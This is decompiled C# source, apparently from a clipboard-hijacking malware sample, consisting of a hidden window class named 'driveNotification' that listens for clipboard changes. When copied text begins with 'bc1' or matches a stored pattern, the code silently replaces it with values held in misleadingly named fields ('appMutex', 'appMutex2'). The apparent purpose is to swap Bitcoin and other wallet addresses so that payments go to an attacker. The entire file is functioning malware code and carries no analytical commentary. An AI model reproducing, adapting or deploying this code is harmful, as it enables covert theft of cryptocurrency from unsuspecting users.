using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7
{
	// Token: 0x02000004 RID: 4
	public sealed class driveNotification
	{
		// Token: 0x02000005 RID: 5
		public class NotificationForm : Form
		{
			// Token: 0x06000029 RID: 41 RVA: 0x0000399A File Offset: 0x00001B9A
			public NotificationForm()
			{
				Program.NativeMethods.SetParent(base.Handle, Program.NativeMethods.intpreclp);
				Program.NativeMethods.AddClipboardFormatListener(base.Handle);
			}

			// Token: 0x0600002A RID: 42 RVA: 0x000039BF File Offset: 0x00001BBF
			private bool RegexResult(Regex pattern)
			{
				return pattern.Match(driveNotification.NotificationForm.currentClipboard).Success;
			}

			// Token: 0x0600002B RID: 43 RVA: 0x000039D8 File Offset: 0x00001BD8
			protected override void WndProc(ref Message m)
			{
				if (m.Msg == 797)
				{
					driveNotification.NotificationForm.currentClipboard = driveNotification.NotificationForm.GetText();
					if (driveNotification.NotificationForm.currentClipboard.StartsWith("bc1"))
					{
						if (this.RegexResult(Program.appMutexRegex) && !driveNotification.NotificationForm.currentClipboard.Contains(Program.appMutex))
						{
							string text = Program.appMutexRegex.Replace(driveNotification.NotificationForm.currentClipboard, Program.appMutex);
							driveNotification.NotificationForm.SetText(text);
						}
					}
					else if (this.RegexResult(Program.appMutexRegex) && !driveNotification.NotificationForm.currentClipboard.Contains(Program.appMutex2))
					{
						string text2 = Program.appMutexRegex.Replace(driveNotification.NotificationForm.currentClipboard, Program.appMutex2);
						driveNotification.NotificationForm.SetText(text2);
					}
				}
				base.WndProc(ref m);
			}

			// Token: 0x17000001 RID: 1
			// (get) Token: 0x0600002C RID: 44 RVA: 0x00003A8C File Offset: 0x00001C8C
			protected override CreateParams CreateParams
			{
				get
				{
					CreateParams createParams = base.CreateParams;
					createParams.ExStyle |= 128;
					return createParams;
				}
			}

			// Token: 0x0600002D RID: 45 RVA: 0x00003AC8 File Offset: 0x00001CC8
			public static string GetText()
			{
				string ReturnValue = string.Empty;
				Thread thread = new Thread(delegate()
				{
					ReturnValue = Clipboard.GetText();
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				thread.Join();
				return ReturnValue;
			}

			// Token: 0x0600002E RID: 46 RVA: 0x00003B28 File Offset: 0x00001D28
			public static void SetText(string txt)
			{
				Thread thread = new Thread(delegate()
				{
					Clipboard.SetText(txt);
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				thread.Join();
			}

			// Token: 0x04000023 RID: 35
			private static string currentClipboard = driveNotification.NotificationForm.GetText();
		}
	}
}
